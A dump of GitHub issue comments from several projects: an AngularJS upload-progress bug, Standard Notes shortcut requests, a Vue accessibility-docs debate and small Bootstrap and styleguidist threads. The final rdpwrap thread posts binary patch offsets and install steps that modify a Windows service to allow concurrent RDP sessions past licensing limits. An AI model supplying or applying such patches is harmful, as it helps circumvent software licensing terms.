angular.js/angular/14436/210122666,"@friend, this feture was obviously not in development for two years - being in the backlog and low-priority and being in development are not the same thing. (I hope we wouldn't need 2 years of active development to complete that feature smiley) That said, if there is a bug, we should totally fix it. Thx for reporting it plus one ",False,True,False,angular.js/angular/14436
angular.js/angular/14436/210149750,"I was very excited when I saw the 1.5.4 release, i check the releases almost every day for this feature since my post  at #11547 (the PR was opened in Apr 11, 2015) It also includes a workaround (it is an hack, but you can't just rewrite token refreshing mechanism, based on custom wrapper around $http, to get around of this hack, can you?). Here is the beauty of the hack you can't archive something like this via $http without the hack &lt;img width=""498"" alt=""screen shot 2016-04-14 at 23 59 08"" src=""",False,True,False,angular.js/angular/14436
angular.js/angular/14436/210171365,"Well. there's a PR with a fix in place (#14438), it should be fine by the time  is out smiley ",False,True,False,angular.js/angular/14436
angular.js/angular/14436/210460646,"Hopefully that will fix this wrinkle -) 21 hours is a bit better than 2 years, eh? ",False,True,False,angular.js/angular/14436
angular.js/angular/14436/210461751,we'll wait for the 1.5.5 anyway D ,False,True,False,angular.js/angular/14436
angular.js/angular/14436/210465646,Thank you for your patience @friend - it is a virtue I am told -) ,False,True,False,angular.js/angular/14436
angular.js/angular/14436/246731542,"eventHandlers{""progress""function (e) { console.log(e); }}, uploadEventHandlers {""progress"" function (e) { console.log(e); }} are not fired  in 1.5.5 1.5.6 1.5.7 15.8 ",False,True,False,angular.js/angular/14436
angular.js/angular/14436/246747683,@friend Could you provide an example? I am sure that the upload event thing works on my projects. ,False,True,False,angular.js/angular/14436
angular.js/angular/14436/246864049,"client ..... &lt;script src=""//cdn.bootcss.com/angular.js/1.5.5/angular.min.js""&gt;&lt;/script&gt; ...... &lt;body ng-controller=""FileManagerCtr as FM""&gt; ..... &lt;div class=""modal fade"" id=""uploadFileModal""&gt;     &lt;div class=""modal-dialog""&gt;       &lt;div class=""modal-content""&gt;         &lt;div class=""modal-header""&gt;           &lt;button type=""button"" class=""close"" data-dismiss=""modal""&gt;&times;&lt;/button&gt;           &lt;h5&gt;Please choose your file&lt;/h5&gt;         &lt;/div&gt;         &lt;div class=""modal-body""&gt;           &lt;div class=""form-inline""&gt;                 &lt;input type=""file"" class=""form-control"" ng-model=""FM.uploadFile""&gt;           &lt;/div&gt;            &lt;br&gt;            &lt;div class=""progress progress-striped""&gt;               &lt;div class=""progress-bar progress-bar-success"" role=""progressbar""                     aria-valuenow=""{FM.uploadprogress}}"" aria-valuemin=""0"" aria-valuemax=""100""                     style=""width {{FM.uploadprogress}}%;""&gt;                     &lt;span class=""sr-only""&gt;{{FM.uploadprogress}}% done&lt;/span&gt;              &lt;/div&gt;           &lt;/div&gt;    &lt;/div&gt;     &lt;div class=""modal-footer""&gt;       &lt;button type=""button"" class=""btn btn-default"" data-dismiss=""modal""  ng-click= ""FM.cancelupload()"" &gt;cancel&lt;/button&gt;       &lt;button type=""button"" class=""btn btn-primary""  ng-disabled=""!FM.uploadFile"" ng-click=""FM.upload()""&gt;upload&lt;/button&gt;     &lt;/div&gt;   &lt;/div&gt; &lt;/div&gt;  &lt;/div&gt; ...... Server var FMApp = angular.module('FMApp', ['ur.file']); FMApp.controller('FileManagerCtr', ['$scope', '$http', '$location','$q',   function ($scope, $http, $location,$q) {     var FM = this;    ......... var canceller = $q.defer(); FM.upload = function () {       console.log('Upload File', FM.uploadFile);       var formData = new FormData();       formData.append('upload', FM.uploadFile);       var myurl = 'api' + FM.curFolderPath + FM.uploadFile.name;   var postParams = {        method 'POST',        url myurl,        data formData,        headers {'Content-Type' undefined },        type'UPLOAD_FILE',        transformRequest angular.identity,        uploadEventHandlers {               progress function (e) {                  if (e.lengthComputable) {                        FM.uploadprogress =  (e.loaded / e.total) * 100;                  }               }        },   };    var sendPost = $http(postParams);   sendPost.success(function (data) {        FM.successData = data;        handleHashChange(FM.curHashPath);    })    .error(function (data, status) {       FM.errorData = ' ' + status + ' ' + data;     });  }; ",False,True,False,angular.js/angular/14436
angular.js/angular/14436/278680603,@friend We can add 1.5.10 to the list. eventHandlers and uploadEventHandlers are never triggered. Thus the need for a PR to fix it is still relevant to this day. ,False,True,False,angular.js/angular/14436
forum/standardnotes/39/245885648,"Is there a plan for keyboard shortcuts? Some off the top of my head  Search, as in put keyboard focus on search bar. () New note () Toggle Markdown preview window ()  And some of the more exotic ones I remember from text editors like Atom  move line up/down () highlighting text and doing the same  ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/318214591, put focus on tag text section ()  ,False,True,False,forum/standardnotes/39
forum/standardnotes/39/318391552,I'm still thinking of a way to do this through extensions but have not yet arrived at a full solution. But it is something I hope to get to. ,False,True,False,forum/standardnotes/39
forum/standardnotes/39/338910566,"This is really important for a good experience. And it does not interfer with the text format. I'd also add shortcut to bring out the menu, and shortcut to delete a note. ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/357541842,"I love all ideas behind Standard Notes (focus on simplicity, privacy, e2e encryption, longevity, standardfile), and I think it's the best option out there (Laverna is super buggy, Turtl's usability is so-so), but... lack of keyboard shortcuts on desktop/web is a deal breaker for me. I'm switching back and forth between SN and nvalt (which I can operate exclusively with the keyboard), always going back to nvalt for this single reason. Lack of any keyboard shortcuts whatsoever is also major reason why I still didn't get SN Extended subscription 😐 Wanted to give my honest feedback. Regardless, keep up the good work Mo! ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/357739241,"Thanks @friend, really appreciate it! Keyboard shortcuts have definitely not been forgotten about. I had a beta of it up but postponed it for various reasons. Will probably re-introduce it at some point this year. ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/385798875,"I agree with @friend and @friend. I didn't realize how important keyboard shortcuts were to me until I realized they were missing in Standard Notes. I have been trying out Standard Notes for over a year, but I can't get myself to seriously use it because missing keyboard shortcuts is a productivity killer for me. ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/386006245,"@friend what kind of shortcuts would be essential to your workflow? It's not out of the question, but would most likely come in the form of an extension. (p.s thanks for the shoutout in your privacy article!) ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/386036334,"Hi Mo. As a macOS user, I would find it most helpful if Standard Notes had a lot of the same shortcuts as the Notes app. The main ones I'd like would be  for a new note to search within a note to search multiple notes to delete a selected note Up and down arrow keys to navigate between selected notes to open the settings panel  Ideally these options would also show up in the macOS menu bar. This would make it possible for users to set their own custom keyboard shortcuts using System Preferences (in Keyboard &gt; Shortcuts &gt; App Shortcuts). Thanks for all the work you all put into Standard Notes! ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/386043830,I'd also love to see an extension that would allow for keyboard shortcuts. In addition to those mentioned above. I'd be happy to see  to set focus to search bar and highlight search term (if one has already been entered) to clear search bar  ,False,True,False,forum/standardnotes/39
forum/standardnotes/39/388646205,"I agree with @friend re ability to customize shortcuts. I believe it's more important to have a decent amount of useful actions exposed to be key-mapped, than to find a perfect keys for them right from the start (I'm sure there are many people like me who would re-map it all to the keys they're used to use in their current note taking apps). So, regarding useful actions I really like how nvALT app handles search and creating of new note from a single input box. You type something, and you get results live as you type. So, if it finds the text in any of the notes then it filters the list to include only these, and it opens the first one. If it doesn't find the text in any of the notes, then I can just hit &lt;enter&gt; to create a note with the search text as its title. I find this super productive. ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/401433987,plus one Keyboard shortcuts I think are crucial to the desktop app (even for the mobile ones). The more the better. Could also be as an extension. ,False,True,False,forum/standardnotes/39
forum/standardnotes/39/419644427,Any updates on this? Just purchased extended and realised there were no keyboard shortcuts! ,False,True,False,forum/standardnotes/39
forum/standardnotes/39/419719852,No updates to give yet.. ,False,True,False,forum/standardnotes/39
forum/standardnotes/39/422651974,"I agree on customizing shortcuts, but if that's not possible then there should at least be a screen to show all available shortcuts.  Having to guess which shortcuts are available or digging through documentation would be less ideal. ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/425176949,plus one Customisable keyboard shortcuts please! Critical feature for productivity. ,False,True,False,forum/standardnotes/39
forum/standardnotes/39/425428677,@friend what shortcuts would you be looking for? ,False,True,False,forum/standardnotes/39
forum/standardnotes/39/425445794,"This feature is keeping me from switching to Standard Notes as well. I think Notational Velocity has a great set of shortcuts. ⌘L to focus in the search bar, arrow keys to navigate search results, and Tab to move the cursor to the editor. I'd love to see the same shortcuts supported in the iOS app as well, as I frequently use my iPad with an external keyboard. ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/425479015,I would like to be able 'alt-tab' through notes and folder + and agree with what another user suggested ,False,True,False,forum/standardnotes/39
forum/standardnotes/39/425910431,"Thanks @friend and @friend. This is definitely planned, so still collecting feedback on what kind of shortcuts should be possible. It will be customizable though. ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/426229886,Thank you! Looking forward to the feature. Keep up the good work. ,False,True,False,forum/standardnotes/39
forum/standardnotes/39/427425892,This is the only thing keeping me from seriously trying this is the ability to hide/show the window with a global hotkey like I do in NvAlt. I use my global hotkey 10's of times a day easy. ,False,True,False,forum/standardnotes/39
forum/standardnotes/39/427566509,"Another vote for keyboard shortcuts. I just became a paid user and SN is definitely the best app for my needs by far. However, the lack of shortcuts is a huge gap! Like others in this thread the keyboard is central to my workflow. Customizable shortcuts would be great, though I'd be looking for the same set described by @friend. I love SN, keep up the amazing work! ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/427580484,"Thanks @friend, noted! ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/433695286,plus one for this feature ,False,True,False,forum/standardnotes/39
forum/standardnotes/39/434671063,Another vote for keyboard shortcuts. An app focused on taking notes and working with text can't not have enough of these. ,False,True,False,forum/standardnotes/39
forum/standardnotes/39/441266684,"Another plus one. Remaining at the keyboard is critical in writing and working with notes. Notational Velocity got it right with respect to the command-L feature (search, or create new note with query title if query returns nothing). Without this feature, I consider Standard Notes to be a great concept but an impractical app, and I'll stick with NValt until it appears (via extension or core capability). ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/441314322,"plus one, I personally can't use any app efficiently without keyboard shortcuts ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/441314954,On the roadmap for 2019 ) ,False,True,False,forum/standardnotes/39
forum/standardnotes/39/441378976,"Okay, that's encouraging enough to jump in on the Black Friday deal! I'll keep pitching the ""create note from search bar"" feature, which I also found in #340. Thank you. ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/445894310,"plus one for shortcuts. Really the only important one for me is ""Search"", But ""New Note"" would be useful too. Keep up the great work! ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/451684986,The one I miss the most is duplicate line (or selected paragraph)! plus one ,False,True,False,forum/standardnotes/39
forum/standardnotes/39/451736526,Came across SN. Love it. Zero keyboard shortcuts.  Uninstall. A pity! ,False,True,False,forum/standardnotes/39
forum/standardnotes/39/453252195,@friend Can I help contribute to make this happen? Happy to implement a solution and/or participate in design discussions. ,False,True,False,forum/standardnotes/39
forum/standardnotes/39/453632576,@friend thanks for offering to help. The implementation will be pretty straightforward. It's just a matter of working our way towards it. ,False,True,False,forum/standardnotes/39
forum/standardnotes/39/453964586,"I just installed SN, but missing shortcuts. I hope this will be avaible soon - then i buy the extended ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/454919967,"I love the concept of Standard Notes. Making me go to the mouse for every action feels like a deal breaker. @friend This is a real tricky reply.  It's been on the roadmap for a year, no progress that I can see. Turning away folks from helping feels like the opposite of progress on this. Unless, reading between the lines, what you're really saying is you expect it to be released in the next month or so? -) ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/455029617,"plus one I can speak with certainty only for myself, but I think part of what’s going on here is that people are looking for a more actively maintained replacement for Notational Velocity and nValt. Standard Notes looks like it would be a candidate, but nValt users can’t migrate because it lacks keyboard shortcuts. The most important ones here would be the following. I’m including the bindings I use but allowing them to be customized or, in macOS, exposing them through the menu bar so that users can add custom keys through System Preferences &gt; Keyboard would be preferable.  Global hotkey to bring Standard Notes to the front (Cmd+Opt+,) Focus search field (Cmd+L) Search in note (Cmd+F)  Also, one would ideally be able to start a new note by typing the title into the search field, which is not possible at present. Pressing Enter from a search would move the cursor into the top result. It’s conceivable that Standard Notes could do something different to nValt, but the main desire here is that the following tasks be keyboard-accessible  Find note by typing words from title and enter it for editing Create new note by focusing search field and typing title Search in note  Others may have other key functionality they want to be keyboard accessible. ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/455227725,"Sorry, I made a mistake mentioning it was on the roadmap. Should know better by now to make feature promises. Keyboard shortcuts will come when SN is ready for them. That's all I can say. ",False,True,False,forum/standardnotes/39
forum/standardnotes/39/456896856,"...two years of talking (apparently starting here  about a basic feature which is standard in native Mac apps? If it really becomes available only as a paid extension after waiting for years, then I think it will be the first app on the Mac to charge extra for basic keyboard shortcuts (( ",False,True,False,forum/standardnotes/39
vuejs.org/vuejs/974/239224881,"React just added a section to their docs on accessibility, and it's pretty nice  think Vue should have a page too! (and I'm happy to write it) Proposed structure  Introduction - why accessibility matters Basic accessibility measures Introduce the WCAG guidelines Highlight a few of the important ones   Accessibility in SPAs Content that relies on the mouse (menu bars, dropdowns, controls on mouseover) Extended input elements Dynamic content (notifications, error messages) and aria-live Announcing page navigation   How to test accessibility  Very high-level overview of what I think we should have - any thoughts before I start writing? ",False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/311727021,You should go ahead with a PR and @friend would help you shape it. ,False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/311758508,"@friend YES! That sounds fantastic. 😄  Exactly as @friend said, you can open a PR (even with incomplete work) and I'll be happy to answer questions, help with tone, etc. My only note on your proposed structure is that I think it'd be good to avoid tying these recommendations to SPAs specifically, as any kind of website that uses Vue will probably be able to benefit. A place I often start when developing a new page is with examples I know I want to cover, then I figure out a way to weave them together with case studies / stories. We like to keep the tone conversational in the docs, but generally avoid jokes/sarcasm, as it often doesn't work cross-culturally. Also, once your talk is live, I think it'd be great to link to it for those that prefer video content. ",False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/313535448,Btw if it's any help we have a bunch of accessibility docs available at  and I do a video series where I try to cover common topics  excited to see you all working on this! ,False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/313585298,Thanks @friend! @friend ^^^ ,False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/313702109,@friend hadn't seen that before - it's such a well written document! Thanks for sharing ) ,False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/313704377,@friend how do I add a new page in hexo? ,False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/313768554,"@friend To add a new page to the guide, create a new  file in . Each page has some metadata at the top, then it's just markdown below. 🙂 ",False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/314070786,Opened a PR here ,False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/369056454,vuejs will never be WCAG 2.0 complaint because its vue-* attributes do not pass HTML5 validation and you guys denied to fix that ,False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/369058277,@friend which WCAG conformance rule relies on HTML validation? ,False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/369060729,"I think, could be wrong here- but the confusion lies in understanding that what the screenreader thinks of the DOM is different than the code that is written before compilation. The target for screenreaders is not to remove directive (which are not  but , yes that's pedantic), but to understand what it's compiled to. Just like React or Angular, there are ways to implement that care for accessibility, and ways to ignore it. Pointing to this doc seems oversimplified to me. ",False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/369062634,"There are no way to ignore WCAG 2.0 recommendations if they are required. A site is either accessible or not. In order to be accessible it must satisfy all criteria. user-agent normally look at the content after running java-script, but if HTML is not valid it increases risk of not passing an accessibility audit. ",False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/369067383,"If anyone is curious, there's a very lengthy discussion on relaxing the custom attributes restriction here  what it's worth, the custom attribute validation rules are relaxed for custom elements. So while  is not allowed,  is allowed. At least according to  ) I know it's a little hand wavy, but I would also question if violating this rule actually has any negative impact on assistive technology. I guess that depends on how strictly folks are interpreting WCAG during the audit. ",False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/369068589,"If vue ignores W3C standards developers may ignore vue. There are many reasons why it is better to write HTML right. For instances, search engines might rank valid sites higher. ",False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/369069518,"Is there evidence to support this? Specifically, that including  or non standard attributes hurt search ranking? I can't imagine search doing this because the practice is already pretty widespread and doesn't have obvious negative user impact. ",False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/369075508,Citation ,False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/369077178,"Yep, like I said, it depends on how strictly folks are interpreting this rule. Forgetting a closing tag can literally change the structure of the DOM and possibly break the page. In Vue's case, they know that what they're doing isn't breaking the structure of the page. And I haven't seen any evidence that it actually harms assistive technology. ",False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/369078291,"as I wrote even if it does not harm assistive technology (in some specific case, for some specific browsers/screenreaders ) it might still harm WCAG 2.0 compliance. ",False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/369081536,"I don't believe those attributes end up in the accessibility tree generated by the browser. So I don't see any evidence to support the claim that they harm any assistive technology, in any case, in any browser. That doesn't mean that don't, I just haven't seen any evidence supporting that. Yes it might. My understanding is that it's up to the firm doing the audit to interpret the rule and say whether it's an actual violation or not. 4.1.1 seems like its intent is to prevent developers from accidentally breaking the page structure with unclosed tags or typos. If what Vue is doing does not actually have any negative, or even perceivable, impact on the user experience, then the auditors may decide that it's not a violation. Again, it's up to how strictly those folks wish to interpret the rule. ",False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/369083081,"If I want to choose between angular or vue I am not going to investigate source code of all existing browsers to find some ""evidence"". As a developer I am looking if the framework requires not valid HTML.  vue encourage using not valid HTML -&gt; that causes problems with IDE, with WCAG compliance, with validation tools  etc etc etc So that means I would prefer to avoid using vue until HTML attributes are fixed. ",False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/369083638,That's fair and totally up to you. I wanted to discuss the issue because it's interesting and worth exploration. ,False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/369220459,"Unless you're using the DOM as your template instead of string templates or render functions (which from what I've seen, most of people don't), the attributes don't even end up in the DOM anyway—as pointed out by Evan in the issue @friend linked to. I don't think Vue's custom attributes are an issue, accessibility-wise. ",False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/369296402,"axe-core developer here. Custom attributes like the ones in Vue and Angular don't pose accessibility barriers, nor should they be called out as a failure of WCAG 4.1.1. This is an interpretation of the guideline, sure, but I'm going off of the feedback from the team of experts at Deque. They do not fail webpages for accessibility simply because they have custom attributes. If there is no barrier posed to users and the user agent can safely parse the page with the tags actually rendered, why would you call it a failure? axe-core does not call these out as violations because they aren't accessibility problems. NuValidator does, but most accessibility subject matter experts wouldn't. I don't think this is an issue at all. From my colleague John Foliot Secondly I would also dispute this. Accessibility is a continuum, not a checkmark. There are varying degrees of accessibility and marking up custom attributes as failures does a service to no one. We have a hard enough time getting adoption of accessibility as it is. I would recommend relaxing your definition of how to meet 4.1.1 and move on to problems with actual user impact. ",False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/369416042,"Yes I agree that issue is not serious in practice and many WCAG requirements and not perfect and sometimes they even not possible to implement (but they often have grounds which you even may not suspect about). I can also agree it probably does not affect assistive technologies (in most cases). However I would like to mention accessibility != WCAG 2.0. and I have wrote  the citation from that page  markup languages, errors in element and attribute syntax and failure to provide properly nested start/end tags lead to errors that prevent user agents from parsing the content reliably. Therefore, the Success Criterion requires that the content can be parsed using only the rules of the formal grammar."" I am not sure what you mean while talking about accessibility, but WCAG 2.0 is landmark There are requirements for government organisations in NSW to be WCAG 2.0 AA complaint. And organisation's sites are either complaint or not. It would be risky to fix all issues and at the end find out the main framework causes problems by design. What if some company decide an application does not pass 4.1.1? Should we rewrite everything then? Or create some patches modifying attributes before vue is loaded? Really? I can hardly imagine that. ",False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/369419364,"I don't understand what your end goal is here. They're talking about adding a doc for accessibility improvements, which is absolutely a positive and necessary move. Use  attributes if you're that concerned about meeting 4.1.1, and let's move this issue forward instead of blocking it. ",False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/369422310,"We are discussing accessibility documentation here do not we? The documentation is supposed to contain section about attributes problem, so people who are considering using vue will be aware of that.  And also it would be confusing to see the ""accessibility"" documentation in case if the framework is not accessible by design. People may think vie is WCAG complaint until they stuck in 4.1.1 ",False,True,False,vuejs.org/vuejs/974
vuejs.org/vuejs/974/369423871,"We're going back and forth and it's pretty clear at this point that some of the conversation is not helpful to the end goal which is creating an accessible experience for our users, especially given the lack of testing and sufficient reporting using assistive technologies. I want to sincerely thank Callum for making this document, I know it came at a personal cost to him and I think it will help people make Vue applications in the future. We'll close this out when we reach a consensus on the PR, which should be soon. ",False,True,False,vuejs.org/vuejs/974
bootstrap/twbs/10133/18518410,"Chrome for Mac. Taken from  large screen, go small, then go large again. Also tested on Safari, where it's also an issue.  ",False,True,False,bootstrap/twbs/10133
bootstrap/twbs/10133/23224343,Duplicate of #9774. Please search next time. ,False,True,False,bootstrap/twbs/10133
bootstrap/twbs/10133/23224416,"@friend Hey, stop bitchin'. I was the first to point it out, but my report was closed.  original report should have been reopened, and your ""duplicate"" (which actually is a duplicate of mine) should have been closed. ",False,True,False,bootstrap/twbs/10133
bootstrap/twbs/10133/23224681,@friend keep  'bitchin'  all these issues you are doing awesome work plus one ,False,True,False,bootstrap/twbs/10133
bootstrap/twbs/10133/23224762,@friend &lt;3 ,False,True,False,bootstrap/twbs/10133
bootstrap/twbs/10133/23342358,"@friend Hey, @friend is just doing what needs doing—there is no need to curse at him for cross linking and trying to de-dupe issues. There's no need to be upset—that attitude doesn't belong here, not to us as maintainers or anyone else for that matter. And as another note, there's basically no way around this that I've found (yet?). I've spent a solid amount of time on it and haven't gotten anywhere—it really seems like a browser bug, as I mentioned in #9774. ",False,True,False,bootstrap/twbs/10133
bootstrap/twbs/10133/23350004,@friend Did you ask StackOverflow? I'm convinced you'd get a more definitive answer were you to reach to the community on this issue. Chrome + Safari is 40+% of market share. ,False,True,False,bootstrap/twbs/10133
react-styleguidist/styleguidist/400/222162370,"What is the best way to use  or  in section markdown files? We have sections in our style guide that use CSS modules, which we need to import to use, for example markdownFile.md Thanks! ",False,True,False,react-styleguidist/styleguidist/400
react-styleguidist/styleguidist/400/294704584,You can only use  in examples ,False,True,False,react-styleguidist/styleguidist/400
react-styleguidist/styleguidist/400/465661389,@friend I am not sure why this issue is closed. The example link you posted also refers to using imports but using imports in examples throws  error. ,False,True,False,react-styleguidist/styleguidist/400
react-styleguidist/styleguidist/400/465664576,Imports are supported in 9.0.0. ,False,True,False,react-styleguidist/styleguidist/400
rdpwrap/stascorp/645/400952716,I am currently able to login by using the same offsets as 288 from here  have only tested x64. ♠; ;----------------------snip part1 [10.0.17763.292] ; Patch CEnforcementCoreGetInstanceOfTSLicense LocalOnlyPatch.x86=1 LocalOnlyOffset.x86=AFAD4 LocalOnlyCode.x86=jmpshort LocalOnlyPatch.x64=1 LocalOnlyOffset.x64=77A11 LocalOnlyCode.x64=jmpshort ; Patch CSessionArbitrationHelperIsSingleSessionPerUserEnabled SingleUserPatch.x86=1 SingleUserOffset.x86=4D665 SingleUserCode.x86=nop SingleUserPatch.x64=1 SingleUserOffset.x64=1322C SingleUserCode.x64=Zero ; Patch CDefPolicyQuery DefPolicyPatch.x86=1 DefPolicyOffset.x86=4BE69 DefPolicyCode.x86=CDefPolicy_Query_eax_ecx DefPolicyPatch.x64=1 DefPolicyOffset.x64=17F45 DefPolicyCode.x64=CDefPolicy_Query_eax_rcx ; Hook CSLQueryInitialize SLInitHook.x86=1 SLInitOffset.x86=5B18A SLInitFunc.x86=New_CSLQuery_Initialize SLInitHook.x64=1 SLInitOffset.x64=1ABFC SLInitFunc.x64=New_CSLQuery_Initialize ;.------------------------------------ ; ; ;.--------------------------snip part2 [10.0.17763.292-SLInit] bInitialized.x86 =CD798 bServerSku.x86 =CD79C lMaxUserSessions.x86 =CD7A0 bAppServerAllowed.x86 =CD7A8 bRemoteConnAllowed.x86=CD7AC bMultimonAllowed.x86 =CD7B0 ulMaxDebugSessions.x86=CD7B4 bFUSEnabled.x86 =CD7B8 bInitialized.x64 =ECAB0 bServerSku.x64 =ECAB4 lMaxUserSessions.x64 =ECAB8 bAppServerAllowed.x64 =ECAC0 bRemoteConnAllowed.x64=ECAC4 bMultimonAllowed.x64 =ECAC8 ulMaxDebugSessions.x64=ECACC bFUSEnabled.x64 =ECAD0 ;.--------------------------- ;` ,False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/455762150,@friend could you proof this build really exists? Post RDPConf screenshot. ,False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/455783351,"  Could be a  version only for pro. I picked it up doing a repair install using the media creation tool having previously had .168, windows update wasn't offering the update at the time. ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/456318244,"I've exactly the same version, not supported. ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/456339965,No need to spam the issue with comments like that. The problem is known and the ticket is open. You'll have to wait. ,False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/456341428,"I do not wanted to spam this issue, but just confirm that release exist too on our side. ) ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/456613834,"Confirmed, .ini snippet provided by @friend works on v10.0.17763.292. Issue can be closed. Multiple concurrent connections allowed  &lt;img width=""407"" alt=""screen shot 2019-01-22 at 4 04 34 pm"" src="" required after .ini file is updated) ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/456688175,How do we use this ini file? I don't see any such thing in the distributed ZIP. ,False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/456689821,@friend add the snippet to the end of the .ini file and leave one blank line in the end. ,False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/456703233,"@friend no it can't, until the support is officially added. ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/456881215,"Hi all, I have change the offset like @friend but i cant login with multiple session. Here is a capture of my problem   i can solve my problem, please ? ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/456906460,"My bad, sorry. ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/456985818,"I really sorry to ask that, but I download the file "" and put in the unzip RDPwrap folder. At the end of file I put the @friend code... I install, update and etc... reboot and nothing fix the problem, still showing ""[not supported]""... What Im doing wrong? ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/457010029,@friend I am also trying to find the  file in order to add the lines above. I found these instructions for editing the  file  approach  Installer log rdpwrap.iniC\Program Files\RDP Wrapper\rdpwrap.ini`. Edit So the goal is to update the ini filed used by RDP Wrapper. I achieved this by using the second approach and it works now ([fully supported]). ,False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/457027476,"Thanks for this fix, i added the snips ad instructed to the ini file and everything lit up!  ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/457035770,Thanks @friend! appears to be fix! Very easy... ,False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/457162436,"Appears ""full supported"" but when the second user try to access the remote desktop the server try to logout the first user. How to fix it? ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/457210876,"@friend Hi,  Can you send your rdpwrap.ini file please ? I havent solve my problem (scroll up) so i have reinstall all, but i need to edit the ini with the correct information. Best regards. ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/457692969,"Hello to everybody. I updated rdpwrap.ini and everything looks perfect   but when I try to connect from another computer, I still have message ""Another user is signed in...etc"" Please, do you have any sugestion? ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/457894118,"Thanks for posting the solution to this issue. I can confirm adding the snippets to the ini also worked for me on 10.0.17763.292. Not sure if it was necessary to run the following exe commands, but I did this before modifying the ini. rdpwinst.exe -u rdpwinst.exe -i After that,  run cmd  ""net stop termservice"", edit the ini to include snippets, and finally ""net start termservice"". ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/457899155,"Thank you  @friend for sharing your experience, but even that didn't helped me. I tried several times, even with fresh installation, but problem is still the same. Configuration seems to be OK, but problem exists, as you can see in screenshots below. I will be grateful for any help...   ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/457955889,Same as above happened to me. Fixed on restart. ,False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/457974192,"This didn't work for me, even with restarting.  I added the snippets to the .ini and I still get Not Listening. &lt;a href="" src="" alt=""Broken-RDPWrapper"" border=""0""&gt;&lt;/a&gt;&lt;br /&gt; What else do I need to check? ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/458146094,"same issue from me , how to fix it ?  I think , one week ago , it was working! ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/458150930,"Here is my rdpwrap.ini.  This is working, just download and extract to your desktop. Follow these steps  Open CMD as Administrator net stop termservice Backup your rdpwrap.ini Copy and overwrite with my rdpwrap.ini (C\Program Files\RDP Wrapper) Go back to the CMD Admin - net start termservice Check with RDPconf rdpwrap.zip  ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/458168328,"Hello )  I updated rdpwrap.ini and everything looks perfect  but when I try to connect from another computer, I still have message ""Another user is signed in...etc"" Please, do you have any sugestion? ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/458182012,"Does the problem go away when you uncheck ""Single session per user"" and ""Apply""?  What version of Windows are you on? 8.1? Server 2012? ",False,True,False,rdpwrap/stascorp/645
